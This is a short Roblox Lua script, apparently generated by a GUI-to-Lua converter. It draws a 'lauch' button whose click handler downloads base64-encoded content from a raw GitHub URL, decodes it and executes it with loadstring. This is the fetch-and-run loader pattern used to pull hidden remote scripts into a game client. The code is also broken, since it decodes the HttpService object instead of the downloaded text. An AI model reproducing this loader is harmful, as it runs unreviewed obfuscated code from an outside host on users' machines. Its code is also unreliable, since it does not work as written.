-- Gui to Lua
-- Version: 3.2

-- Instances:

local startgui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

--Properties:

startgui.Name = "startgui"
startgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
startgui.Enabled = false
startgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = startgui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.245861217, 0, 0.115618661, 0)
Frame.Size = UDim2.new(0, 460, 0, 270)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(47, 255, 15)
TextButton.Position = UDim2.new(0.0434782617, 0, 0.100000001, 0)
TextButton.Size = UDim2.new(0, 416, 0, 204)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "lauch"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

-- Scripts:

local function PKDH_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	function dec(data)
		data = string.gsub(data, '[^'..b..'=]', '')
		return (data:gsub('.', function(x)
			if (x == '=') then return '' end
			local r,f='',(b:find(x)-1)
			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
			return r;
		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
			if (#x ~= 8) then return '' end
			local c=0
			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
			return string.char(c)
		end))
	end
	script.Parent.MouseButton1Click:Connect(function()
		local a = game:GetService("HttpService")
		a:GetAsync("https://raw.githubusercontent.com/yesman01/base64test/main/main")
		loadstring(dec(a))
	end)
end
coroutine.wrap(PKDH_fake_script)()
